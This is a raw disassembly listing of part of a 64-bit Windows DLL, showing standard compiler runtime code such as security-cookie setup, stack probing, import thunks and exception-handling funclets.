   1800041cf:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   1800041d3:	48 c7 45 10 00 00 00 	movq   $0x0,0x10(%rbp)
   1800041da:	00 
   1800041db:	ff 15 0f 0f 00 00    	call   *0xf0f(%rip)        # 0x1800050f0
   1800041e1:	48 8b 45 10          	mov    0x10(%rbp),%rax
   1800041e5:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1800041e9:	ff 15 f1 0e 00 00    	call   *0xef1(%rip)        # 0x1800050e0
   1800041ef:	8b c0                	mov    %eax,%eax
   1800041f1:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   1800041f5:	ff 15 dd 0e 00 00    	call   *0xedd(%rip)        # 0x1800050d8
   1800041fb:	8b c0                	mov    %eax,%eax
   1800041fd:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   180004201:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   180004205:	ff 15 c5 0e 00 00    	call   *0xec5(%rip)        # 0x1800050d0
   18000420b:	8b 45 18             	mov    0x18(%rbp),%eax
   18000420e:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   180004212:	48 c1 e0 20          	shl    $0x20,%rax
   180004216:	48 33 45 18          	xor    0x18(%rbp),%rax
   18000421a:	48 33 45 f0          	xor    -0x10(%rbp),%rax
   18000421e:	48 33 c1             	xor    %rcx,%rax
   180004221:	48 b9 ff ff ff ff ff 	movabs $0xffffffffffff,%rcx
   180004228:	ff 00 00 
   18000422b:	48 23 c1             	and    %rcx,%rax
   18000422e:	48 b9 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rcx
   180004235:	2b 00 00 
   180004238:	48 3b c3             	cmp    %rbx,%rax
   18000423b:	48 0f 44 c1          	cmove  %rcx,%rax
   18000423f:	48 89 05 fa 2d 00 00 	mov    %rax,0x2dfa(%rip)        # 0x180007040
   180004246:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   18000424b:	48 f7 d0             	not    %rax
   18000424e:	48 89 05 2b 2e 00 00 	mov    %rax,0x2e2b(%rip)        # 0x180007080
   180004255:	48 83 c4 30          	add    $0x30,%rsp
   180004259:	5d                   	pop    %rbp
   18000425a:	c3                   	ret
   18000425b:	cc                   	int3
   18000425c:	48 8d 0d dd 34 00 00 	lea    0x34dd(%rip),%rcx        # 0x180007740
   180004263:	48 ff 25 8e 0e 00 00 	rex.W jmp *0xe8e(%rip)        # 0x1800050f8
   18000426a:	cc                   	int3
   18000426b:	cc                   	int3
   18000426c:	48 8d 0d cd 34 00 00 	lea    0x34cd(%rip),%rcx        # 0x180007740
   180004273:	e9 cc 00 00 00       	jmp    0x180004344
   180004278:	48 8d 05 d1 34 00 00 	lea    0x34d1(%rip),%rax        # 0x180007750
   18000427f:	c3                   	ret
   180004280:	48 83 ec 28          	sub    $0x28,%rsp
   180004284:	e8 a7 e3 ff ff       	call   0x180002630
   180004289:	48 83 08 24          	orq    $0x24,(%rax)
   18000428d:	e8 e6 ff ff ff       	call   0x180004278
   180004292:	48 83 08 02          	orq    $0x2,(%rax)
   180004296:	48 83 c4 28          	add    $0x28,%rsp
   18000429a:	c3                   	ret
   18000429b:	cc                   	int3
   18000429c:	48 8d 05 d5 34 00 00 	lea    0x34d5(%rip),%rax        # 0x180007778
   1800042a3:	c3                   	ret
   1800042a4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800042a9:	57                   	push   %rdi
   1800042aa:	48 83 ec 20          	sub    $0x20,%rsp
   1800042ae:	48 8d 1d 8b 1d 00 00 	lea    0x1d8b(%rip),%rbx        # 0x180006040
   1800042b5:	48 8d 3d 84 1d 00 00 	lea    0x1d84(%rip),%rdi        # 0x180006040
   1800042bc:	eb 12                	jmp    0x1800042d0
   1800042be:	48 8b 03             	mov    (%rbx),%rax
   1800042c1:	48 85 c0             	test   %rax,%rax
   1800042c4:	74 06                	je     0x1800042cc
   1800042c6:	ff 15 9c 0f 00 00    	call   *0xf9c(%rip)        # 0x180005268
   1800042cc:	48 83 c3 08          	add    $0x8,%rbx
   1800042d0:	48 3b df             	cmp    %rdi,%rbx
   1800042d3:	72 e9                	jb     0x1800042be
   1800042d5:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800042da:	48 83 c4 20          	add    $0x20,%rsp
   1800042de:	5f                   	pop    %rdi
   1800042df:	c3                   	ret
   1800042e0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800042e5:	57                   	push   %rdi
   1800042e6:	48 83 ec 20          	sub    $0x20,%rsp
   1800042ea:	48 8d 1d 5f 1d 00 00 	lea    0x1d5f(%rip),%rbx        # 0x180006050
   1800042f1:	48 8d 3d 58 1d 00 00 	lea    0x1d58(%rip),%rdi        # 0x180006050
   1800042f8:	eb 12                	jmp    0x18000430c
   1800042fa:	48 8b 03             	mov    (%rbx),%rax
   1800042fd:	48 85 c0             	test   %rax,%rax
   180004300:	74 06                	je     0x180004308
   180004302:	ff 15 60 0f 00 00    	call   *0xf60(%rip)        # 0x180005268
   180004308:	48 83 c3 08          	add    $0x8,%rbx
   18000430c:	48 3b df             	cmp    %rdi,%rbx
   18000430f:	72 e9                	jb     0x1800042fa
   180004311:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180004316:	48 83 c4 20          	add    $0x20,%rsp
   18000431a:	5f                   	pop    %rdi
   18000431b:	c3                   	ret
   18000431c:	cc                   	int3
   18000431d:	cc                   	int3
   18000431e:	cc                   	int3
   18000431f:	cc                   	int3
   180004320:	ff 25 4a 0e 00 00    	jmp    *0xe4a(%rip)        # 0x180005170
   180004326:	ff 25 2c 0e 00 00    	jmp    *0xe2c(%rip)        # 0x180005158
   18000432c:	ff 25 2e 0e 00 00    	jmp    *0xe2e(%rip)        # 0x180005160
   180004332:	ff 25 18 0e 00 00    	jmp    *0xe18(%rip)        # 0x180005150
   180004338:	ff 25 0a 0e 00 00    	jmp    *0xe0a(%rip)        # 0x180005148
   18000433e:	ff 25 dc 0d 00 00    	jmp    *0xddc(%rip)        # 0x180005120
   180004344:	ff 25 ce 0d 00 00    	jmp    *0xdce(%rip)        # 0x180005118
   18000434a:	ff 25 58 0e 00 00    	jmp    *0xe58(%rip)        # 0x1800051a8
   180004350:	ff 25 5a 0e 00 00    	jmp    *0xe5a(%rip)        # 0x1800051b0
   180004356:	ff 25 84 0e 00 00    	jmp    *0xe84(%rip)        # 0x1800051e0
   18000435c:	ff 25 ce 0e 00 00    	jmp    *0xece(%rip)        # 0x180005230
   180004362:	ff 25 c0 0e 00 00    	jmp    *0xec0(%rip)        # 0x180005228
   180004368:	ff 25 b2 0e 00 00    	jmp    *0xeb2(%rip)        # 0x180005220
   18000436e:	ff 25 a4 0e 00 00    	jmp    *0xea4(%rip)        # 0x180005218
   180004374:	ff 25 5e 0e 00 00    	jmp    *0xe5e(%rip)        # 0x1800051d8
   18000437a:	ff 25 88 0e 00 00    	jmp    *0xe88(%rip)        # 0x180005208
   180004380:	ff 25 7a 0e 00 00    	jmp    *0xe7a(%rip)        # 0x180005200
   180004386:	ff 25 6c 0e 00 00    	jmp    *0xe6c(%rip)        # 0x1800051f8
   18000438c:	ff 25 5e 0e 00 00    	jmp    *0xe5e(%rip)        # 0x1800051f0
   180004392:	ff 25 50 0e 00 00    	jmp    *0xe50(%rip)        # 0x1800051e8
   180004398:	ff 25 1a 0e 00 00    	jmp    *0xe1a(%rip)        # 0x1800051b8
   18000439e:	cc                   	int3
   18000439f:	cc                   	int3
   1800043a0:	b0 01                	mov    $0x1,%al
   1800043a2:	c3                   	ret
   1800043a3:	cc                   	int3
   1800043a4:	33 c0                	xor    %eax,%eax
   1800043a6:	c3                   	ret
   1800043a7:	cc                   	int3
   1800043a8:	48 83 ec 28          	sub    $0x28,%rsp
   1800043ac:	4d 8b 41 38          	mov    0x38(%r9),%r8
   1800043b0:	48 8b ca             	mov    %rdx,%rcx
   1800043b3:	49 8b d1             	mov    %r9,%rdx
   1800043b6:	e8 0d 00 00 00       	call   0x1800043c8
   1800043bb:	b8 01 00 00 00       	mov    $0x1,%eax
   1800043c0:	48 83 c4 28          	add    $0x28,%rsp
   1800043c4:	c3                   	ret
   1800043c5:	cc                   	int3
   1800043c6:	cc                   	int3
   1800043c7:	cc                   	int3
   1800043c8:	40 53                	rex push %rbx
   1800043ca:	45 8b 18             	mov    (%r8),%r11d
   1800043cd:	48 8b da             	mov    %rdx,%rbx
   1800043d0:	41 83 e3 f8          	and    $0xfffffff8,%r11d
   1800043d4:	4c 8b c9             	mov    %rcx,%r9
   1800043d7:	41 f6 00 04          	testb  $0x4,(%r8)
   1800043db:	4c 8b d1             	mov    %rcx,%r10
   1800043de:	74 13                	je     0x1800043f3
   1800043e0:	41 8b 40 08          	mov    0x8(%r8),%eax
   1800043e4:	4d 63 50 04          	movslq 0x4(%r8),%r10
   1800043e8:	f7 d8                	neg    %eax
   1800043ea:	4c 03 d1             	add    %rcx,%r10
   1800043ed:	48 63 c8             	movslq %eax,%rcx
   1800043f0:	4c 23 d1             	and    %rcx,%r10
   1800043f3:	49 63 c3             	movslq %r11d,%rax
   1800043f6:	4a 8b 14 10          	mov    (%rax,%r10,1),%rdx
   1800043fa:	48 8b 43 10          	mov    0x10(%rbx),%rax
   1800043fe:	8b 48 08             	mov    0x8(%rax),%ecx
   180004401:	48 8b 43 08          	mov    0x8(%rbx),%rax
   180004405:	f6 44 01 03 0f       	testb  $0xf,0x3(%rcx,%rax,1)
   18000440a:	74 10                	je     0x18000441c
   18000440c:	0f b6 44 01 03       	movzbl 0x3(%rcx,%rax,1),%eax
   180004411:	b9 f0 ff ff ff       	mov    $0xfffffff0,%ecx
   180004416:	48 23 c1             	and    %rcx,%rax
   180004419:	4c 03 c8             	add    %rax,%r9
   18000441c:	4c 33 ca             	xor    %rdx,%r9
   18000441f:	49 8b c9             	mov    %r9,%rcx
   180004422:	5b                   	pop    %rbx
   180004423:	e9 98 ef ff ff       	jmp    0x1800033c0
   180004428:	48 8b c4             	mov    %rsp,%rax
   18000442b:	48 89 58 08          	mov    %rbx,0x8(%rax)
   18000442f:	48 89 68 10          	mov    %rbp,0x10(%rax)
   180004433:	48 89 70 18          	mov    %rsi,0x18(%rax)
   180004437:	48 89 78 20          	mov    %rdi,0x20(%rax)
   18000443b:	41 56                	push   %r14
   18000443d:	48 83 ec 20          	sub    $0x20,%rsp
   180004441:	49 8b 59 38          	mov    0x38(%r9),%rbx
   180004445:	48 8b f2             	mov    %rdx,%rsi
   180004448:	4d 8b f0             	mov    %r8,%r14
   18000444b:	48 8b e9             	mov    %rcx,%rbp
   18000444e:	49 8b d1             	mov    %r9,%rdx
   180004451:	48 8b ce             	mov    %rsi,%rcx
   180004454:	49 8b f9             	mov    %r9,%rdi
   180004457:	4c 8d 43 04          	lea    0x4(%rbx),%r8
   18000445b:	e8 68 ff ff ff       	call   0x1800043c8
   180004460:	8b 45 04             	mov    0x4(%rbp),%eax
   180004463:	24 66                	and    $0x66,%al
   180004465:	f6 d8                	neg    %al
   180004467:	b8 01 00 00 00       	mov    $0x1,%eax
   18000446c:	45 1b c9             	sbb    %r9d,%r9d
   18000446f:	41 f7 d9             	neg    %r9d
   180004472:	44 03 c8             	add    %eax,%r9d
   180004475:	44 85 4b 04          	test   %r9d,0x4(%rbx)
   180004479:	74 11                	je     0x18000448c
   18000447b:	4c 8b cf             	mov    %rdi,%r9
   18000447e:	4d 8b c6             	mov    %r14,%r8
   180004481:	48 8b d6             	mov    %rsi,%rdx
   180004484:	48 8b cd             	mov    %rbp,%rcx
   180004487:	e8 94 fe ff ff       	call   0x180004320
   18000448c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180004491:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   180004496:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   18000449b:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   1800044a0:	48 83 c4 20          	add    $0x20,%rsp
   1800044a4:	41 5e                	pop    %r14
   1800044a6:	c3                   	ret
   1800044a7:	cc                   	int3
   1800044a8:	cc                   	int3
   1800044a9:	cc                   	int3
   1800044aa:	cc                   	int3
   1800044ab:	cc                   	int3
   1800044ac:	cc                   	int3
   1800044ad:	cc                   	int3
   1800044ae:	cc                   	int3
   1800044af:	cc                   	int3
   1800044b0:	cc                   	int3
   1800044b1:	cc                   	int3
   1800044b2:	cc                   	int3
   1800044b3:	cc                   	int3
   1800044b4:	cc                   	int3
   1800044b5:	cc                   	int3
   1800044b6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1800044bd:	00 00 00 
   1800044c0:	48 83 ec 10          	sub    $0x10,%rsp
   1800044c4:	4c 89 14 24          	mov    %r10,(%rsp)
   1800044c8:	4c 89 5c 24 08       	mov    %r11,0x8(%rsp)
   1800044cd:	4d 33 db             	xor    %r11,%r11
   1800044d0:	4c 8d 54 24 18       	lea    0x18(%rsp),%r10
   1800044d5:	4c 2b d0             	sub    %rax,%r10
   1800044d8:	4d 0f 42 d3          	cmovb  %r11,%r10
   1800044dc:	65 4c 8b 1c 25 10 00 	mov    %gs:0x10,%r11
   1800044e3:	00 00 
   1800044e5:	4d 3b d3             	cmp    %r11,%r10
   1800044e8:	73 16                	jae    0x180004500
   1800044ea:	66 41 81 e2 00 f0    	and    $0xf000,%r10w
   1800044f0:	4d 8d 9b 00 f0 ff ff 	lea    -0x1000(%r11),%r11
   1800044f7:	41 c6 03 00          	movb   $0x0,(%r11)
   1800044fb:	4d 3b d3             	cmp    %r11,%r10
   1800044fe:	75 f0                	jne    0x1800044f0
   180004500:	4c 8b 14 24          	mov    (%rsp),%r10
   180004504:	4c 8b 5c 24 08       	mov    0x8(%rsp),%r11
   180004509:	48 83 c4 10          	add    $0x10,%rsp
   18000450d:	c3                   	ret
   18000450e:	ff 25 2c 0c 00 00    	jmp    *0xc2c(%rip)        # 0x180005140
   180004514:	ff 25 16 0c 00 00    	jmp    *0xc16(%rip)        # 0x180005130
   18000451a:	ff 25 a8 0c 00 00    	jmp    *0xca8(%rip)        # 0x1800051c8
   180004520:	cc                   	int3
   180004521:	cc                   	int3
   180004522:	cc                   	int3
   180004523:	cc                   	int3
   180004524:	cc                   	int3
   180004525:	cc                   	int3
   180004526:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000452d:	00 00 00 
   180004530:	ff e0                	jmp    *%rax
   180004532:	cc                   	int3
   180004533:	cc                   	int3
   180004534:	cc                   	int3
   180004535:	cc                   	int3
   180004536:	cc                   	int3
   180004537:	cc                   	int3
   180004538:	cc                   	int3
   180004539:	cc                   	int3
   18000453a:	cc                   	int3
   18000453b:	cc                   	int3
   18000453c:	cc                   	int3
   18000453d:	cc                   	int3
   18000453e:	cc                   	int3
   18000453f:	cc                   	int3
   180004540:	cc                   	int3
   180004541:	cc                   	int3
   180004542:	cc                   	int3
   180004543:	cc                   	int3
   180004544:	cc                   	int3
   180004545:	cc                   	int3
   180004546:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000454d:	00 00 00 
   180004550:	ff 25 12 0d 00 00    	jmp    *0xd12(%rip)        # 0x180005268
   180004556:	cc                   	int3
   180004557:	cc                   	int3
   180004558:	cc                   	int3
   180004559:	cc                   	int3
   18000455a:	cc                   	int3
   18000455b:	cc                   	int3
   18000455c:	cc                   	int3
   18000455d:	cc                   	int3
   18000455e:	cc                   	int3
   18000455f:	cc                   	int3
   180004560:	40 55                	rex push %rbp
   180004562:	48 83 ec 20          	sub    $0x20,%rsp
   180004566:	48 8b ea             	mov    %rdx,%rbp
   180004569:	8b 45 30             	mov    0x30(%rbp),%eax
   18000456c:	83 e0 01             	and    $0x1,%eax
   18000456f:	85 c0                	test   %eax,%eax
   180004571:	74 0d                	je     0x180004580
   180004573:	83 65 30 fe          	andl   $0xfffffffe,0x30(%rbp)
   180004577:	48 8b 4d 38          	mov    0x38(%rbp),%rcx
   18000457b:	e8 e0 d4 ff ff       	call   0x180001a60
   180004580:	48 83 c4 20          	add    $0x20,%rsp
   180004584:	5d                   	pop    %rbp
   180004585:	c3                   	ret
   180004586:	cc                   	int3
   180004587:	cc                   	int3
   180004588:	cc                   	int3
   180004589:	cc                   	int3
   18000458a:	cc                   	int3
   18000458b:	cc                   	int3
   18000458c:	cc                   	int3
   18000458d:	cc                   	int3
   18000458e:	cc                   	int3
   18000458f:	cc                   	int3
   180004590:	48 8d 8a 20 00 00 00 	lea    0x20(%rdx),%rcx
   180004597:	e9 34 d5 ff ff       	jmp    0x180001ad0
   18000459c:	48 8d 8a 40 00 00 00 	lea    0x40(%rdx),%rcx
   1800045a3:	e9 28 d5 ff ff       	jmp    0x180001ad0
   1800045a8:	40 55                	rex push %rbp
   1800045aa:	48 83 ec 20          	sub    $0x20,%rsp
   1800045ae:	48 8b ea             	mov    %rdx,%rbp
   1800045b1:	4c 8d 0d 18 d5 ff ff 	lea    -0x2ae8(%rip),%r9        # 0x180001ad0
   1800045b8:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   1800045be:	ba 20 00 00 00       	mov    $0x20,%edx
   1800045c3:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   1800045c7:	e8 50 ee ff ff       	call   0x18000341c
   1800045cc:	48 83 c4 20          	add    $0x20,%rsp
   1800045d0:	5d                   	pop    %rbp
   1800045d1:	c3                   	ret
   1800045d2:	48 8d 8a 90 00 00 00 	lea    0x90(%rdx),%rcx
   1800045d9:	e9 62 de ff ff       	jmp    0x180002440
   1800045de:	cc                   	int3
   1800045df:	cc                   	int3
   1800045e0:	48 8d 8a 70 00 00 00 	lea    0x70(%rdx),%rcx
   1800045e7:	e9 e4 d4 ff ff       	jmp    0x180001ad0
   1800045ec:	48 8d 8a 58 00 00 00 	lea    0x58(%rdx),%rcx
   1800045f3:	e9 68 d4 ff ff       	jmp    0x180001a60
   1800045f8:	48 8d 8a b0 00 00 00 	lea    0xb0(%rdx),%rcx
   1800045ff:	48 83 c1 08          	add    $0x8,%rcx
   180004603:	e9 f8 d3 ff ff       	jmp    0x180001a00
   180004608:	48 8d 8a b0 00 00 00 	lea    0xb0(%rdx),%rcx
   18000460f:	48 83 c1 18          	add    $0x18,%rcx
   180004613:	e9 78 d3 ff ff       	jmp    0x180001990
   180004618:	48 8d 8a b0 00 00 00 	lea    0xb0(%rdx),%rcx
   18000461f:	e9 5c d2 ff ff       	jmp    0x180001880
   180004624:	cc                   	int3
   180004625:	cc                   	int3
   180004626:	cc                   	int3
   180004627:	cc                   	int3
   180004628:	cc                   	int3
   180004629:	cc                   	int3
   18000462a:	cc                   	int3
   18000462b:	cc                   	int3
   18000462c:	cc                   	int3
   18000462d:	cc                   	int3
   18000462e:	cc                   	int3
   18000462f:	cc                   	int3
   180004630:	48 8d 8a 20 00 00 00 	lea    0x20(%rdx),%rcx
   180004637:	e9 84 dc ff ff       	jmp    0x1800022c0
   18000463c:	48 8d 8a 20 00 00 00 	lea    0x20(%rdx),%rcx
   180004643:	e9 78 dc ff ff       	jmp    0x1800022c0
   180004648:	cc                   	int3
   180004649:	cc                   	int3
   18000464a:	cc                   	int3
   18000464b:	cc                   	int3
   18000464c:	cc                   	int3
   18000464d:	cc                   	int3
   18000464e:	cc                   	int3
   18000464f:	cc                   	int3
   180004650:	48 8d 8a 30 00 00 00 	lea    0x30(%rdx),%rcx
   180004657:	e9 14 de ff ff       	jmp    0x180002470
   18000465c:	40 55                	rex push %rbp
   18000465e:	48 83 ec 20          	sub    $0x20,%rsp
   180004662:	48 8b ea             	mov    %rdx,%rbp
   180004665:	80 7d 20 00          	cmpb   $0x0,0x20(%rbp)
   180004669:	75 16                	jne    0x180004681
   18000466b:	4c 8b 4d 78          	mov    0x78(%rbp),%r9
   18000466f:	4c 8b 45 70          	mov    0x70(%rbp),%r8
   180004673:	48 8b 55 68          	mov    0x68(%rbp),%rdx
   180004677:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   18000467b:	e8 08 ee ff ff       	call   0x180003488
   180004680:	90                   	nop
   180004681:	48 83 c4 20          	add    $0x20,%rsp
   180004685:	5d                   	pop    %rbp
   180004686:	c3                   	ret
   180004687:	cc                   	int3
   180004688:	40 53                	rex push %rbx
   18000468a:	55                   	push   %rbp
   18000468b:	48 83 ec 28          	sub    $0x28,%rsp
   18000468f:	48 8b ea             	mov    %rdx,%rbp
   180004692:	48 89 4d 30          	mov    %rcx,0x30(%rbp)
   180004696:	48 8b 45 30          	mov    0x30(%rbp),%rax
   18000469a:	48 8b 08             	mov    (%rax),%rcx
   18000469d:	48 89 4d 28          	mov    %rcx,0x28(%rbp)
   1800046a1:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1800046a5:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%rax)
   1800046ab:	74 0c                	je     0x1800046b9
   1800046ad:	c7 45 20 00 00 00 00 	movl   $0x0,0x20(%rbp)
   1800046b4:	8b 45 20             	mov    0x20(%rbp),%eax
   1800046b7:	eb 22                	jmp    0x1800046db
   1800046b9:	e8 68 fc ff ff       	call   0x180004326
   1800046be:	48 8b 4d 28          	mov    0x28(%rbp),%rcx
   1800046c2:	48 89 08             	mov    %rcx,(%rax)
   1800046c5:	48 8b 45 30          	mov    0x30(%rbp),%rax
   1800046c9:	48 8b 58 08          	mov    0x8(%rax),%rbx
   1800046cd:	e8 5a fc ff ff       	call   0x18000432c
   1800046d2:	48 89 18             	mov    %rbx,(%rax)
   1800046d5:	e8 7c fc ff ff       	call   0x180004356
   1800046da:	90                   	nop
   1800046db:	48 83 c4 28          	add    $0x28,%rsp
   1800046df:	5d                   	pop    %rbp
   1800046e0:	5b                   	pop    %rbx
   1800046e1:	c3                   	ret
   1800046e2:	cc                   	int3
   1800046e3:	40 55                	rex push %rbp
   1800046e5:	48 8b ea             	mov    %rdx,%rbp
   1800046e8:	48 8b 01             	mov    (%rcx),%rax
   1800046eb:	33 c9                	xor    %ecx,%ecx
   1800046ed:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   1800046f3:	0f 94 c1             	sete   %cl
   1800046f6:	8b c1                	mov    %ecx,%eax
   1800046f8:	5d                   	pop    %rbp
   1800046f9:	c3                   	ret
   1800046fa:	cc                   	int3
   1800046fb:	40 55                	rex push %rbp
   1800046fd:	48 83 ec 20          	sub    $0x20,%rsp
   180004701:	48 8b ea             	mov    %rdx,%rbp
   180004704:	8a 4d 40             	mov    0x40(%rbp),%cl
   180004707:	48 83 c4 20          	add    $0x20,%rsp
   18000470b:	5d                   	pop    %rbp
   18000470c:	e9 9f f0 ff ff       	jmp    0x1800037b0
   180004711:	cc                   	int3
   180004712:	40 55                	rex push %rbp
   180004714:	48 83 ec 20          	sub    $0x20,%rsp
   180004718:	48 8b ea             	mov    %rdx,%rbp
   18000471b:	8a 4d 20             	mov    0x20(%rbp),%cl
   18000471e:	e8 8d f0 ff ff       	call   0x1800037b0
   180004723:	90                   	nop
   180004724:	48 83 c4 20          	add    $0x20,%rsp
   180004728:	5d                   	pop    %rbp
   180004729:	c3                   	ret
   18000472a:	cc                   	int3
   18000472b:	40 55                	rex push %rbp
   18000472d:	48 83 ec 20          	sub    $0x20,%rsp
   180004731:	48 8b ea             	mov    %rdx,%rbp
   180004734:	48 83 c4 20          	add    $0x20,%rsp
   180004738:	5d                   	pop    %rbp
   180004739:	e9 fe ee ff ff       	jmp    0x18000363c
   18000473e:	cc                   	int3
   18000473f:	40 55                	rex push %rbp
   180004741:	48 83 ec 30          	sub    $0x30,%rsp
   180004745:	48 8b ea             	mov    %rdx,%rbp
   180004748:	48 8b 01             	mov    (%rcx),%rax
   18000474b:	8b 10                	mov    (%rax),%edx
   18000474d:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   180004752:	89 54 24 20          	mov    %edx,0x20(%rsp)
   180004756:	4c 8d 0d 2b f1 ff ff 	lea    -0xed5(%rip),%r9        # 0x180003888
   18000475d:	4c 8b 45 70          	mov    0x70(%rbp),%r8
   180004761:	8b 55 68             	mov    0x68(%rbp),%edx
   180004764:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   180004768:	e8 3f ee ff ff       	call   0x1800035ac
   18000476d:	90                   	nop
   18000476e:	48 83 c4 30          	add    $0x30,%rsp
   180004772:	5d                   	pop    %rbp
   180004773:	c3                   	ret
   180004774:	cc                   	int3
   180004775:	cc                   	int3
   180004776:	cc                   	int3
   180004777:	cc                   	int3
   180004778:	cc                   	int3
   180004779:	cc                   	int3
   18000477a:	cc                   	int3
   18000477b:	cc                   	int3
   18000477c:	cc                   	int3
   18000477d:	cc                   	int3
   18000477e:	cc                   	int3
   18000477f:	cc                   	int3
   180004780:	48 8d 0d d1 2f 00 00 	lea    0x2fd1(%rip),%rcx        # 0x180007758
   180004787:	e9 74 d8 ff ff       	jmp    0x180002000
